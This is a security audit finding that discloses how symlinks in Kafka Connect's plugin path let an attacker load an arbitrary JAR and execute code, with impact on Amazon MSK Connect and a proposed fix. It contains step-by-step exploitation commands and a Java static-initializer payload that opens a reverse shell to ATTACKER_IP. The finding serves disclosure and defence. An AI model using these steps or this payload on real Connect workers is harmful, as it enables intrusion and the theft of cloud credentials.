# FINDING-003: Kafka Connect Plugin Loading — Symlink Traversal → RCE

## Metadata

| Field | Value |
|-------|-------|
| Finding ID | FINDING-003 |
| Target | `apache/kafka` |
| Component | `PluginUtils`, `Plugins` (Connect runtime) |
| Source Files | `connect/runtime/src/main/java/org/apache/kafka/connect/runtime/isolation/PluginUtils.java` (lines ~190–280), `Plugins.java` (lines ~1–684) |
| Category | Remote Code Execution |
| CVSS v3.1 Score | **8.8 HIGH** |
| CVSS v3.1 Vector | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` |
| CVSS Breakdown | ISCBase=0.9148, ISC=5.873, Exploit=2.835, Score=Roundup(8.708)=8.8 |
| CWE | CWE-22: Path Traversal; CWE-502: Deserialization of Untrusted Data (via classloading) |
| Requires Auth | LOW — requires write access to the declared plugin path OR a prior write primitive |
| MSK Affected | YES — MSK Connect (custom plugins are customer-managed) |

## Summary

`PluginUtils.pluginLocations()` and `pluginUrls()` resolve plugin paths without checking if symlink targets escape the declared plugin directory. Combined with `Plugins.java`'s `URLClassLoader` (no JAR signature verification), any JAR reachable via a symlink from the plugin directory is loaded and executed during connector instantiation. Static initializers in the loaded class run immediately at `loadClass()` time with full worker process privileges.

## Vulnerable Code (verbatim)

```java
// PluginUtils.java — pluginLocations() (lines ~190-215)
public static Set<Path> pluginLocations(String pluginPath, boolean failFast) {
    Set<Path> locations = new LinkedHashSet<>();
    for (String path : pluginPath.split("\\s*,\\s*")) {
        if (path.isEmpty()) continue;
        Path location = Paths.get(path).toAbsolutePath();  // normalizes ".." but NOT symlinks
        if (!Files.isDirectory(location)) {
            if (failFast) throw new ConnectException("Invalid plugin.path: " + location);
            continue;
        }
        locations.add(location);  // no symlink target validation
    }
    return locations;
}
```

```java
// PluginUtils.java — pluginUrls() (lines ~218-250)
public static List<Path> pluginUrls(Path topPath) throws IOException {
    final List<Path> urls = new ArrayList<>();
    Files.walkFileTree(topPath,
        EnumSet.of(FileVisitOption.FOLLOW_LINKS),   // <-- follows symlinks
        Integer.MAX_VALUE,
        new SimpleFileVisitor<Path>() {
            @Override
            public FileVisitResult visitFile(Path file, BasicFileAttributes attrs) {
                if (isArchive(file)) {
                    urls.add(file);  // symlink target added with no boundary check
                }
                return FileVisitResult.CONTINUE;
            }
        });
    return urls;
}
```

```java
// Plugins.java — pluginClass() — RCE trigger point
protected static <U> Class<? extends U> pluginClass(
    DelegatingClassLoader loader,
    String classOrAlias,
    Class<U> pluginClass
) {
    try {
        @SuppressWarnings("unchecked")
        Class<? extends U> klass = (Class<? extends U>)
            loader.loadClass(classOrAlias);  // static initializers fire HERE
        // ...
    } catch (ClassNotFoundException e) {
        throw new ConnectException("...", e);
    }
}
```

## Root Cause

Java's `Files.walkFileTree` with `FileVisitOption.FOLLOW_LINKS` resolves symlinks transparently — a symlink at `/opt/kafka/plugins/evil.jar` pointing to `/tmp/malicious.jar` appears as `/opt/kafka/plugins/evil.jar` to the walk but delivers the bytes from `/tmp/malicious.jar`. There is no post-resolution check confirming the canonical path is still within the declared plugin directory. Additionally, no JAR signing verification (e.g., JAR manifest `Sealed: true`, code-signing certificates) is performed before the classloader executes the JAR's content.

## Attack Prerequisites

- Write access to any path reachable via symlink from the declared `plugin.path`
  - This can be achieved via: a second connector with write access to `/tmp`, SSRF to a metadata endpoint that leaks credentials, or direct filesystem access to the worker
- OR: direct write access to the `plugin.path` directory itself (e.g., shared volume in Kubernetes/ECS)
- Network access to the Connect REST API (port 8083) to trigger connector creation

## Step-by-Step Exploitation

1. Compile `payloads/finding-003-malicious-plugin.java` with ATTACKER_IP and port
2. Place the resulting JAR at `/tmp/MaliciousConnector.jar` (any path outside plugin.path)
3. Create a symlink inside the declared plugin directory:
   ```bash
   ln -s /tmp/MaliciousConnector.jar /opt/kafka/plugins/kafka-extra-v2.jar
   ```
4. On Connect worker restart (or via plugin scan), `PluginUtils.pluginUrls()` follows the symlink and adds the JAR to the classloader
5. Create a connector referencing the malicious class:
   ```bash
   curl -X POST http://CONNECT_WORKER:8083/connectors \
     -H "Content-Type: application/json" \
     -d '{"name":"init","config":{"connector.class":"MaliciousConnector","tasks.max":"1","topics":"x"}}'
   ```
6. `Plugins.pluginClass()` calls `loader.loadClass("MaliciousConnector")`
7. Static initializer executes: reverse shell opens to attacker's listener

## Payload

See `payloads/finding-003-malicious-plugin.java` and `payloads/finding-003-symlink-setup.sh`.

```java
// Static initializer in MaliciousConnector — executes at classloading time
static {
    try {
        Runtime.getRuntime().exec(new String[]{
            "/bin/bash", "-c",
            "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"
        });
    } catch (Exception ignored) {}
}
```

## Expected Outcome

On a vulnerable Connect worker: a reverse shell opens immediately when the `createConnector` API call triggers classloading. The shell runs with the Connect worker process identity — on MSK Connect, this is the execution role's IAM permissions.

## Amazon MSK Specific Impact

- **MSK Connect:** Custom plugin JARs are uploaded by customers to S3 and installed on managed workers. The managed worker's `plugin.path` is where the custom plugin is extracted. If an attacker can place a symlink inside the S3 bucket prefix used for plugin extraction, this attack path applies.
- **Execution Role:** MSK Connect workers run with an attached IAM execution role. Code execution on the worker grants full access to all IAM permissions assigned to that role (commonly includes `kafka-cluster:*`, S3 bucket access, and other AWS service permissions).
- **AWS-managed vs customer-managed:** AWS manages the worker OS and JVM, but the plugin content is entirely customer-controlled — this is the attack surface.
- **Affected MSK Connect versions:** All versions since MSK Connect GA (2021)

## Proposed Fix

1. After resolving symlinks in `pluginUrls()`, verify the canonical path is still within the declared `topPath`:
   ```java
   Path realPath = file.toRealPath();
   if (!realPath.startsWith(topPath.toRealPath())) {
       logger.warn("Plugin file {} resolves outside declared plugin.path — skipping", file);
       return FileVisitResult.CONTINUE;
   }
   ```
2. Add JAR signing verification: require plugins to be signed with a trusted code-signing certificate before loading
3. Use `FileVisitOption.NOFOLLOW_LINKS` (or remove `FOLLOW_LINKS`) in `walkFileTree`

## Detection

- **Worker logs:** Look for classloader errors from unexpected paths
- **S3 audit:** CloudTrail `PutObject` events to the plugin S3 prefix from unexpected principals
- **File monitoring:** inotify or auditd watching `plugin.path` for symlink creation
